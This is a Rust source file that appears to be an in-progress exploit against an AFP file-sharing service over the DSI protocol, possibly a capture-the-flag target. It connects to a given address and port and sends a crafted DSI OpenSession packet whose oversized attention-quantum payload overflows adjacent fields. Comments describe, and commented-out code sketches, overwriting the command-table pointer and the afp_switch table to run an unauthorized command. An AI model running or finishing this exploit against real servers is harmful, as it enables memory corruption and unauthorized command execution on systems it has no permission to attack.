use std::net::TcpStream;
use std::io::Read;
use std::io::Write;
use std::error::Error;
// use std::fs::File;
use std::env;

static LOCAL: bool = false;

// target information 
/* 
 * controllable length / data parsing
 * can overflow pointer to command list
 * can rewrite command list with unauthorized command 
 */

fn parse_args(args: Vec<String>) -> String {
    if args.len() < 3 {
        panic!("Error: usage <binary> <address> <port>");
    }
    let mut addr: String = args[1].to_string().clone();
    addr.push_str(":");
    addr.push_str(&args[2]);
    return addr;
}

fn create_socket(addr: String) -> Result<TcpStream, std::io::Error> {
    let stream = TcpStream::connect(addr);
    return stream;
}

fn try_read(s: &mut TcpStream) -> (usize, [u8; 1024]) {
    let mut recvbuf = [0; 1024];
    let n = s.read(&mut recvbuf);
    match n {
        Ok(n) => return (n, recvbuf),
        Err(e) => panic!("Problem reading from server {:?}", e),
    };
}

fn try_write(s: &mut TcpStream, buf: &[u8]) -> Result<usize, std::io::Error> {
    let n = s.write(buf);
    return n;
}

fn add_header(data: &mut Vec<u8>, request_id: u8, command: u8) -> Vec<u8> {
    let mut dsi_header: Vec<u8> = Vec::new();
    dsi_header.push(0x00);                                   // "request" flag
    dsi_header.push(command);                                // command
    dsi_header.extend_from_slice(&[0x0, request_id]);        // request id
    dsi_header.extend_from_slice(b"\x00\x00\x00\x00");       // data offset
    dsi_header.extend_from_slice(&(data.len() as u32).to_be_bytes());
    dsi_header.extend_from_slice(b"\x00\x00\x00\x00");       // reserved
    dsi_header.extend_from_slice(&data);
    return dsi_header;
}

fn main() -> Result<(), Box<dyn Error>> {
    let mut recvbuf: [u8; 1024];
    let mut n: usize;
    const AFP_SWITCH: u32      = 0x00244a20;
    const AFP_GETSERVINFO: u64 = 0x0002d2f0;

    if LOCAL {
        Ok(())
    }
    else {
        // create read and write fds, sleep
        let args: Vec<String> = env::args().collect();
        let addr: String = parse_args(args);
        println!("Connecting to {}", addr);

        let mut r = create_socket(addr)?;
        let mut w = r.try_clone()?;
        std::thread::sleep(std::time::Duration::from_secs(1));

        // read initial prompt
        // (n, recvbuf) = try_read(&mut r);
        // eprintln!("received {} bytes: {}", n, String::from_utf8_lossy(&recvbuf[..n]));

        // send initial packet to overwrite the pointer to `commands`
        // pointer to afp_switch table address
        let mut dsi_payload: Vec<u8> = Vec::new();
        dsi_payload.extend_from_slice(b"\x00\x00\x40\x00");  // client quantum
        dsi_payload.extend_from_slice(b"\x00\x00\x40\x00");  // client quantum
        dsi_payload.extend_from_slice(b"\xde\xad\xbe\xef");  // clobber client quantum
        dsi_payload.extend_from_slice(b"\xde\xad\xbe\xef");  // clobber ids
        // dsi_payload.extend_from_slice(b"\xde\xad\xbe\xef");  // clobber ids
        // dsi_payload.extend_from_slice(&AFP_SWITCH.to_le_bytes());  // clobber command pointer

        let mut dsi_opensession: Vec<u8> = Vec::new();
        dsi_opensession.push(0x01);                          // attention quantum
        dsi_opensession.extend_from_slice(&(dsi_payload.len() as u8).to_be_bytes());  // payload length
        dsi_opensession.extend_from_slice(&dsi_payload);
        let packet: Vec<u8> = add_header(&mut dsi_opensession, 0x1, 0x4); 
        
        // write payload
        n = try_write(&mut w, &packet)?;
        eprintln!("sent {} bytes", n);
        
        // try reading response
        (n, recvbuf) = try_read(&mut r);
        eprintln!("received {} bytes: {:?}", n, &recvbuf[..n]);

        // send second packet to write the incoming command into the afp_switch
        // table while also calling an index that is overwritten
        // let mut afp_payload: Vec<u8> = Vec::new();
        // afp_payload.push(0x01);                          // second entry in table
        // afp_payload.extend_from_slice(&[0; 7]);                     // pad rest of qword
        // afp_payload.extend_from_slice(&AFP_GETSERVINFO.to_le_bytes());  // overwrite second entry
        // let packet: Vec<u8> = add_header(&mut afp_payload, 0x2, 0x2); 

        // // write payload
        // n = try_write(&mut w, &packet)?;
        // eprintln!("sent {} bytes", n);
    
        // // try reading response
        // (n, recvbuf) = try_read(&mut r);
        // eprintln!("received {} bytes: {:?}", n, &recvbuf[..n]);
    
        Ok(())
    }
}
